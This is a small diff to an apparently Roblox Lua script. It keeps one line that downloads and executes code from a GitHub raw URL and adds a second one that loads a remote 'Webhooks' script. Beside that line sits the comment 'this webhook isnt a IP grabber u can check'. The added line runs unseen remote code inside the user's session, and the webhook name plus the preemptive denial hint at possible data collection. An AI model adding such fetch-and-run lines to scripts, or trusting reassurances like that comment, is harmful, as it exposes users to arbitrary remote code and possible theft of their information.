@@ -4,8 +4,10 @@ local StarterGui = game:GetService("StarterGui")
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 
--- Tag
+-- tag
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/DevTools/main/Tag"))()
+-- this webhook isnt a IP grabber u can check
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/Scripts/refs/heads/main/Webhooks/1.luau"))()
 
 -- Functions
 local Wait = task.wait
